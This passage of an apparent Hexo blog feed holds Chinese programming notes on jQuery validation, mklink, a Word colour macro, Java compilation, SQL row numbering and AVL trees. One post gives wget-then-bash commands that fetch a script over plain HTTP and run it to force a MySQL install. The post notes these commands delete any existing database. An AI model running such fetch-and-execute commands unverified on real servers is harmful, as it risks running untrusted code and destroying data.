class="string">&quot;*只允许2-10位英文字母、数字或者下画线！&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  $.validator.<span class="title function_">addMethod</span>(</span><br><span class="line">    <span class="string">&quot;checkPwd&quot;</span>,</span><br><span class="line">    <span class="keyword">function</span> (<span class="params">value, element, params</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> checkPwd = <span class="regexp">/^\w&#123;6,16&#125;$/g</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">optional</span>(element) || checkPwd.<span class="title function_">test</span>(value);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;*只允许6-16位英文字母、数字或者下画线！&quot;</span></span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="https://blog.csdn.net/u014800380/article/details/52106923?depth_1-">https://blog.csdn.net/u014800380/article/details/52106923?depth_1-</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>mklink-链接iCloud&amp;OneDrive文件夹</title>
    <url>/2021/05/15/mklink-%E9%93%BE%E6%8E%A5iCloud&amp;OneDrive%E6%96%87%E4%BB%B6%E5%A4%B9/</url>
    <content><![CDATA[<h1 id="mklink"><a href="#mklink" class="headerlink" title="#mklink"></a>#mklink</h1><p>创建符号链接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MKLINK [[/D] | [/H] | [/J]] Link Target</span><br><span class="line"></span><br><span class="line">        /D      创建目录符号链接。默认为文件</span><br><span class="line">                符号链接。</span><br><span class="line">        /H      创建硬链接而非符号链接。</span><br><span class="line">        /J      创建目录联接。</span><br><span class="line">        Link    指定新的符号链接名称。</span><br><span class="line">        Target  指定新链接引用的路径</span><br><span class="line">                (相对或绝对)。</span><br><span class="line">				</span><br></pre></td></tr></table></figure>

<p>将<code>C:\Users\iCloudDrive\iCloud~md~obsidian\myku</code><br>链接到<code>E:\OneDrive\Notebooks\Obsidian\myku</code> 命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\20294&gt;mklink /d &quot;E:\OneDrive\Notebooks\Obsidian\myku&quot; &quot;C:\Users\iCloudDrive\iCloud~md~obsidian\myku&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>CMD</tag>
      </tags>
  </entry>
  <entry>
    <title>word屏幕配色-豆沙</title>
    <url>/2021/05/15/word%E5%B1%8F%E5%B9%95%E9%85%8D%E8%89%B2-%E8%B1%86%E6%B2%99/</url>
    <content><![CDATA[<h1 id="word-屏幕配色-豆沙"><a href="#word-屏幕配色-豆沙" class="headerlink" title="word 屏幕配色-豆沙"></a>word 屏幕配色-豆沙</h1><p>如果只针对 Word 的话，可以尝试在”开发工具”选项卡中新建一个宏，复制下面的内容进行运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sub Screen_Color_green_bean()</span><br><span class="line">&#x27;</span><br><span class="line">&#x27; Screen_Color_green_bean 宏</span><br><span class="line">&#x27;</span><br><span class="line">&#x27;</span><br><span class="line">ActiveDocument.Background.Fill.Visible = msoTrue</span><br><span class="line">ActiveDocument.Background.Fill.ForeColor.RGB = RGB(199, 237, 204)</span><br><span class="line">ActiveDocument.Background.Fill.Solid</span><br><span class="line">ActiveDocument.ActiveWindow.View.DisplayBackgrounds = True</span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>其中 RGB 部分的三个数字，您可以按照自己的需求进行调整，看下效果。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">绿豆沙色能有效的减轻长时间用电脑的用眼疲劳！</span><br><span class="line">色调：<span class="number">85</span>，饱和度：<span class="number">123</span>，亮度：<span class="number">205</span>；</span><br><span class="line">RGB颜色红：<span class="number">199</span>，绿：<span class="number">237</span>，蓝：<span class="number">204</span>；</span><br><span class="line">十六进制颜色：#C7EDCC或用#CCE8CF</span><br><span class="line"></span><br><span class="line">其他几种电脑窗口视力保护色：</span><br><span class="line"></span><br><span class="line">银河白 #FFFFFF <span class="title function_">RGB</span><span class="params">(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span></span><br><span class="line"></span><br><span class="line">杏仁黄 #FAF9DE <span class="title function_">RGB</span><span class="params">(<span class="number">250</span>, <span class="number">249</span>, <span class="number">222</span>)</span></span><br><span class="line"></span><br><span class="line">秋叶褐 #FFF2E2 <span class="title function_">RGB</span><span class="params">(<span class="number">255</span>, <span class="number">242</span>, <span class="number">226</span>)</span></span><br><span class="line"></span><br><span class="line">胭脂红 #FDE6E0 <span class="title function_">RGB</span><span class="params">(<span class="number">253</span>, <span class="number">230</span>, <span class="number">224</span>)</span></span><br><span class="line"></span><br><span class="line">青草绿 #E3EDCD <span class="title function_">RGB</span><span class="params">(<span class="number">227</span>, <span class="number">237</span>, <span class="number">205</span>)</span></span><br><span class="line"></span><br><span class="line">海天蓝 #DCE2F1 <span class="title function_">RGB</span><span class="params">(<span class="number">220</span>, <span class="number">226</span>, <span class="number">241</span>)</span></span><br><span class="line"></span><br><span class="line">葛巾紫 #E9EBFE <span class="title function_">RGB</span><span class="params">(<span class="number">233</span>, <span class="number">235</span>, <span class="number">254</span>)</span></span><br><span class="line"></span><br><span class="line">极光灰 #EAEAEF <span class="title function_">RGB</span><span class="params">(<span class="number">234</span>, <span class="number">234</span>, <span class="number">239</span>)</span></span><br><span class="line"></span><br><span class="line">以上来源：https:<span class="comment">//www.iteye.com/blog/igogo007-2432004</span></span><br><span class="line"></span><br><span class="line">我们可以设置Dev、VS2017、Quartus II等等软件的背景颜色为护眼色，对缓解视疲劳有好处。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>word</category>
      </categories>
      <tags>
        <tag>word</tag>
      </tags>
  </entry>
  <entry>
    <title>使用命令行编译java</title>
    <url>/2021/05/15/%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96%E8%AF%91java/</url>
    <content><![CDATA[<h1 id="使用命令行编译-java"><a href="#使用命令行编译-java" class="headerlink" title="使用命令行编译 java"></a>使用命令行编译 java</h1><h2 id="编译单个文件"><a href="#编译单个文件" class="headerlink" title="编译单个文件"></a>编译单个文件</h2><h3 id="在当前目录下的命令行输入："><a href="#在当前目录下的命令行输入：" class="headerlink" title="在当前目录下的命令行输入："></a>在当前目录下的命令行输入：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac xxx.java</span><br><span class="line">java xxx</span><br></pre></td></tr></table></figure>

<p>编译成功，输出结果。</p>
<p>如果 <strong>出现“编码 GBK 的不可映射字符”的错误</strong>，原因是，系统默认的编码格式与源文件编码格式不同，编译时没有显式指定源文件编码格式的话，JDK 会把源文件从系统默认编码格式转换为 Java 默认编码格式，这样就出现乱码了。</p>
<h3 id="解决命令："><a href="#解决命令：" class="headerlink" title="解决命令："></a>解决命令：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -encoding utf-8 xxx.java</span><br></pre></td></tr></table></figure>

<h2 id="编译运行含-package-语句的类"><a href="#编译运行含-package-语句的类" class="headerlink" title="编译运行含 package 语句的类"></a><a href="http://www.cnblogs.com/chanchan/p/7613261.html">编译运行含 package 语句的类</a></h2><h3 id="文件如下："><a href="#文件如下：" class="headerlink" title="文件如下："></a>文件如下：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- Point.java</span><br><span class="line">- TestPoint.java</span><br></pre></td></tr></table></figure>



<h3 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h3><h4 id="Point-java"><a href="#Point-java" class="headerlink" title="Point.java"></a>Point.java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> X;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> Y;</span><br><span class="line">......省略</span><br></pre></td></tr></table></figure>

<h4 id="TestPoint-java"><a href="#TestPoint-java" class="headerlink" title="TestPoint.java"></a>TestPoint.java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> com.company.Point;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">......省略</span><br></pre></td></tr></table></figure>

<h3 id="使用命令："><a href="#使用命令：" class="headerlink" title="使用命令："></a>使用命令：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -encoding utf-8  -d . Point.java</span><br><span class="line">javac -encoding utf-8  -d . TestPoint.java</span><br></pre></td></tr></table></figure>

<p><strong>参数”-d .”，表示在当前目录下生成包文件夹，并把类文件放到该文件夹下</strong>；不加-d 参数的话，在当前目录下能生成类文件，但运行时会提示找不到或无法加载类文件，原因在于，JVM 要到包文件夹下寻找类文件，而此时只在当前目录下有类文件，这样就会出错。</p>
<h3 id="注意：“Error-1-1-java-非法字符-‘-ufeff’”错误解决办法"><a href="#注意：“Error-1-1-java-非法字符-‘-ufeff’”错误解决办法" class="headerlink" title="注意：“Error:(1, 1) java: 非法字符: ‘\ufeff’”错误解决办法"></a>注意：<a href="https://www.cnblogs.com/ShaYeBlog/p/9755107.html">“Error:(1, 1) java: 非法字符: ‘\ufeff’”错误解决办法</a></h3><h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>用 Windows 记事本打开并修改.java 文件保存后重新编译运行项目出现“Error:(1, 1) java: 非法字符: ‘\ufeff’”错误</p>
<p>原来这是因为 Windows 记事本在修改 UTF-8 文件时自作聪明地在文件开头添加 BOM 导致的，所以才会导致 IDEA 不能正确读取.java 文件从而程序出错。</p>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>在编辑器 IDEA 中将文件编码更改为 UTF-16，再改回 UTF-8 即可，其实就相当于刷新了一下文件编码。</p>
<p>成功效果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">路径： .../com/company</span><br><span class="line">- Point.class</span><br><span class="line">- TestPoint.class</span><br></pre></td></tr></table></figure>



<h3 id="然后运行-TestPoint，在命令行输入命令："><a href="#然后运行-TestPoint，在命令行输入命令：" class="headerlink" title="然后运行 TestPoint，在命令行输入命令："></a>然后运行 TestPoint，在命令行输入命令：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java com.company.TestPoint</span><br></pre></td></tr></table></figure>

<p>成功效果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">point2点的当前信息是：X坐标是：<span class="number">0</span></span><br><span class="line">Y坐标是:<span class="number">0</span></span><br><span class="line">point3点的当前信息是：X坐标是：<span class="number">1</span></span><br><span class="line">。。。。。。省略</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>如何给查询出的SQL记录添加序号列</title>
    <url>/2021/05/15/%E5%A6%82%E4%BD%95%E7%BB%99%E6%9F%A5%E8%AF%A2%E5%87%BA%E7%9A%84SQL%E8%AE%B0%E5%BD%95%E6%B7%BB%E5%8A%A0%E5%BA%8F%E5%8F%B7%E5%88%97/</url>
    <content><![CDATA[<hr>
<h2 id="title-如何给查询出的-SQL-记录添加序号列-tags-“SQL”"><a href="#title-如何给查询出的-SQL-记录添加序号列-tags-“SQL”" class="headerlink" title="title: 如何给查询出的 SQL 记录添加序号列 tags: “SQL”"></a>title: 如何给查询出的 SQL 记录添加序号列 tags: “SQL”</h2><h1 id="如何给查询出的-SQL-记录添加序号列"><a href="#如何给查询出的-SQL-记录添加序号列" class="headerlink" title="如何给查询出的 SQL 记录添加序号列"></a>如何给查询出的 SQL 记录添加序号列</h1><p>给查询出的 SQL 记录添加序号列，解决方法有以下两种</p>
<p>第一：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">ORDER</span> <span class="keyword">BY</span> a.字段 <span class="keyword">ASC</span>) <span class="keyword">AS</span> XUHAO,a.<span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> a</span><br></pre></td></tr></table></figure>

<p>(table 为表名，字段为表 a 中的字段名)</p>
<p>第二：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">RANK</span>()  <span class="keyword">OVER</span> (<span class="keyword">ORDER</span> <span class="keyword">BY</span> a.字段 <span class="keyword">ASC</span>) <span class="keyword">AS</span> XUHAO,a.<span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> a</span><br></pre></td></tr></table></figure>

<p>(table 为表名，字段为表 a 中的字段名)</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>宝塔面板强制安装MySQL8.0</title>
    <url>/2021/05/15/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%BC%BA%E5%88%B6%E5%AE%89%E8%A3%85MySQL8.0/</url>
    <content><![CDATA[<h1 id="宝塔面板强制安装-MySQL8-0"><a href="#宝塔面板强制安装-MySQL8-0" class="headerlink" title="宝塔面板强制安装 MySQL8.0"></a>宝塔面板强制安装 MySQL8.0</h1><p>mysql 终于更新到 8.0，MySQL8.0 对比以往的版本有了很大的提升，但是要求的服务器配置也就变得越来越高。对于低配置服务器，在宝塔面板进行安装时，总会出现“至少需要 2 个 CPU 核心才能安装”或者“至少需要 XXX 内存才能安装”。但我们又想要体验 MySQL8.0 新版本，这时候该怎么办呢？只有强制在宝塔面板中安装 MySQL8.0。</p>
<h2 id="低配置服务器在宝塔面板中安装-MySQL8-0-方法"><a href="#低配置服务器在宝塔面板中安装-MySQL8-0-方法" class="headerlink" title="低配置服务器在宝塔面板中安装 MySQL8.0 方法"></a>低配置服务器在宝塔面板中安装 MySQL8.0 方法</h2><p>远程连接到服务器中，进入&#x2F;www&#x2F;server&#x2F;panel&#x2F;install 并执行下面代码。</p>
<p>编译安装 MySQL8.0，请在远程控制台中输入下面脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://download.bt.cn/install/0/mysql.sh;</span><br><span class="line">bash mysql.sh install 5.7</span><br></pre></td></tr></table></figure>

<p>极速安装 MySQL8.0，请在远程控制台中输入下面脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://download.bt.cn/install/1/mysql.sh;</span><br><span class="line">bash mysql.sh install 5.7</span><br></pre></td></tr></table></figure>

<p>将 5.7 替换成你要安装的 mysql 版本。</p>
<p>请注意：如果你已经安装了数据库，上面的命令会卸载删除当前数据库及数据</p>
<p>这样低内存服务器在宝塔面板安装 Mysql8.0 就实现了！</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
        <category>宝塔</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MySQL</tag>
        <tag>宝塔</tag>
      </tags>
  </entry>
  <entry>
    <title>平衡二叉树&amp;二叉排序树</title>
    <url>/2021/05/15/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91&amp;%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/</url>
    <content><![CDATA[<h1 id="平衡二叉树-amp-二叉排序树"><a href="#平衡二叉树-amp-二叉排序树" class="headerlink" title="平衡二叉树&amp;二叉排序树"></a>平衡二叉树&amp;二叉排序树</h1><h2 id="算法库："><a href="#算法库：" class="headerlink" title="算法库："></a>算法库：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;                    <span class="comment">//定义关键字类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>                     <span class="comment">//记录类型</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType key;                        <span class="comment">//关键字项</span></span><br><span class="line">    <span class="type">int</span> bf;                             <span class="comment">//平衡因子</span></span><br><span class="line">    InfoType data;                      <span class="comment">//其他数据域</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>* lchild, * rchild;        <span class="comment">//左右孩子指针</span></span><br><span class="line">&#125; BSTNode;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">LeftProcess</span><span class="params">(BSTNode*&amp; p, <span class="type">int</span>&amp; taller)</span></span></span><br><span class="line"><span class="function"><span class="comment">//对以指针p所指结点为根的二叉树作左平衡旋转处理,本算法结束时,指针p指向新的根结点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* p1, * p2;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;bf == <span class="number">0</span>)           <span class="comment">//原本左、右子树等高,现因左子树增高而使树增高</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">1</span>;</span><br><span class="line">        taller = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;bf == <span class="number">-1</span>)     <span class="comment">//原本右子树比左子树高,现左、右子树等高</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">        taller = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                    <span class="comment">//原本左子树比右子树高,需作左子树的平衡处理</span></span><br><span class="line">    &#123;</span><br><span class="line">        p1 = p-&gt;lchild;       <span class="comment">//p指向*p的左子树根结点</span></span><br><span class="line">        <span class="keyword">if</span> (p1-&gt;bf == <span class="number">1</span>)      <span class="comment">//新结点插入在*b的左孩子的左子树上,要作LL调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;lchild = p1-&gt;rchild;</span><br><span class="line">            p1-&gt;rchild = p;</span><br><span class="line">            p-&gt;bf = p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            p = p1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p1-&gt;bf == <span class="number">-1</span>)    <span class="comment">//新结点插入在*b的左孩子的右子树上,要作LR调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 = p1-&gt;rchild;</span><br><span class="line">            p1-&gt;rchild = p2-&gt;lchild;</span><br><span class="line">            p2-&gt;lchild = p1;</span><br><span class="line">            p-&gt;lchild = p2-&gt;rchild;</span><br><span class="line">            p2-&gt;rchild = p;</span><br><span class="line">            <span class="keyword">if</span> (p2-&gt;bf == <span class="number">0</span>)          <span class="comment">//新结点插在*p2处作为叶子结点的情况</span></span><br><span class="line">                p-&gt;bf = p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p2-&gt;bf == <span class="number">1</span>)     <span class="comment">//新结点插在*p2的左子树上的情况</span></span><br><span class="line">            &#123;</span><br><span class="line">                p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">                p-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                    <span class="comment">//新结点插在*p2的右子树上的情况</span></span><br><span class="line">            &#123;</span><br><span class="line">                p1-&gt;bf = <span class="number">1</span>;</span><br><span class="line">                p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p2;</span><br><span class="line">            p-&gt;bf = <span class="number">0</span>;            <span class="comment">//仍将p指向新的根结点,并置其bf值为0</span></span><br><span class="line">        &#125;</span><br><span class="line">        taller = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RightProcess</span><span class="params">(BSTNode*&amp; p, <span class="type">int</span>&amp; taller)</span></span></span><br><span class="line"><span class="function"><span class="comment">//对以指针p所指结点为根的二叉树作右平衡旋转处理,本算法结束时,指针p指向新的根结点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* p1, * p2;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;bf == <span class="number">0</span>)           <span class="comment">//原本左、右子树等高,现因右子树增高而使树增高</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">        taller = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;bf == <span class="number">1</span>)      <span class="comment">//原本左子树比右子树高,现左、右子树等高</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">        taller = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                    <span class="comment">//原本右子树比左子树高,需作右子树的平衡处理</span></span><br><span class="line">    &#123;</span><br><span class="line">        p1 = p-&gt;rchild;       <span class="comment">//p指向*p的右子树根结点</span></span><br><span class="line">        <span class="keyword">if</span> (p1-&gt;bf == <span class="number">-1</span>)     <span class="comment">//新结点插入在*b的右孩子的右子树上,要作RR调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;rchild = p1-&gt;lchild;</span><br><span class="line">            p1-&gt;lchild = p;</span><br><span class="line">            p-&gt;bf = p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            p = p1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p1-&gt;bf == <span class="number">1</span>) <span class="comment">//新结点插入在*p的右孩子的左子树上,要作RL调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 = p1-&gt;lchild;</span><br><span class="line">            p1-&gt;lchild = p2-&gt;rchild;</span><br><span class="line">            p2-&gt;rchild = p1;</span><br><span class="line">            p-&gt;rchild = p2-&gt;lchild;</span><br><span class="line">            p2-&gt;lchild = p;</span><br><span class="line">            <span class="keyword">if</span> (p2-&gt;bf == <span class="number">0</span>)          <span class="comment">//新结点插在*p2处作为叶子结点的情况</span></span><br><span class="line">                p-&gt;bf = p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p2-&gt;bf == <span class="number">-1</span>)    <span class="comment">//新结点插在*p2的右子树上的情况</span></span><br><span class="line">            &#123;</span><br><span class="line">                p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">                p-&gt;bf = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                    <span class="comment">//新结点插在*p2的左子树上的情况</span></span><br><span class="line">            &#123;</span><br><span class="line">                p1-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">                p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p2;</span><br><span class="line">            p-&gt;bf = <span class="number">0</span>;            <span class="comment">//仍将p指向新的根结点,并置其bf值为0</span></span><br><span class="line">        &#125;</span><br><span class="line">        taller = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertAVL</span><span class="params">(BSTNode*&amp; b, KeyType e, <span class="type">int</span>&amp; taller)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*若在平衡的二叉排序树b中不存在和e有相同关键字的结点,则插入一个</span></span></span><br><span class="line"><span class="comment"><span class="function">  数据元素为e的新结点,并返回1,否则返回0。若因插入而使二叉排序树</span></span></span><br><span class="line"><span class="comment"><span class="function">  失去平衡,则作平衡旋转处理,布尔变量taller反映b长高与否*/</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>)         <span class="comment">//原为空树,插入新结点,树“长高”,置taller为1</span></span><br><span class="line">    &#123;</span><br><span class="line">        b = (BSTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BSTNode));</span><br><span class="line">        b-&gt;key = e;</span><br><span class="line">        b-&gt;lchild = b-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line">        b-&gt;bf = <span class="number">0</span>;</span><br><span class="line">        taller = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == b-&gt;key)              <span class="comment">//树中已存在和e有相同关键字的结点则不再插入</span></span><br><span class="line">        &#123;</span><br><span class="line">            taller = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e &lt; b-&gt;key)               <span class="comment">//应继续在*b的左子树中进行搜索</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">InsertAVL</span>(b-&gt;lchild, e, taller)) == <span class="number">0</span>) <span class="comment">//未插入</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (taller == <span class="number">1</span>)          <span class="comment">//已插入到*b的左子树中且左子树“长高”</span></span><br><span class="line">                <span class="built_in">LeftProcess</span>(b, taller);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">//应继续在*b的右子树中进行搜索</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">InsertAVL</span>(b-&gt;rchild, e, taller)) == <span class="number">0</span>) <span class="comment">//未插入</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (taller == <span class="number">1</span>)          <span class="comment">//已插入到b的右子树且右子树“长高”</span></span><br><span class="line">                <span class="built_in">RightProcess</span>(b, taller);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispBSTree</span><span class="params">(BSTNode* b)</span> <span class="comment">//以括号表示法输出AVL</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b-&gt;key);</span><br><span class="line">        <span class="keyword">if</span> (b-&gt;lchild != <span class="literal">NULL</span> || b-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            <span class="built_in">DispBSTree</span>(b-&gt;lchild);</span><br><span class="line">            <span class="keyword">if</span> (b-&gt;rchild != <span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="built_in">DispBSTree</span>(b-&gt;rchild);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">LeftProcess1</span><span class="params">(BSTNode*&amp; p, <span class="type">int</span>&amp; taller)</span>  <span class="comment">//在删除结点时进行左处理</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* p1, * p2;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;bf == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">        taller = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;bf == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">        taller = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>        <span class="comment">//p-&gt;bf=-1</span></span><br><span class="line">    &#123;</span><br><span class="line">        p1 = p-&gt;rchild;</span><br><span class="line">        <span class="keyword">if</span> (p1-&gt;bf == <span class="number">0</span>)          <span class="comment">//需作RR调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;rchild = p1-&gt;lchild;</span><br><span class="line">            p1-&gt;lchild = p;</span><br><span class="line">            p1-&gt;bf = <span class="number">1</span>;</span><br><span class="line">            p-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">            p = p1;</span><br><span class="line">            taller = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p1-&gt;bf == <span class="number">-1</span>)    <span 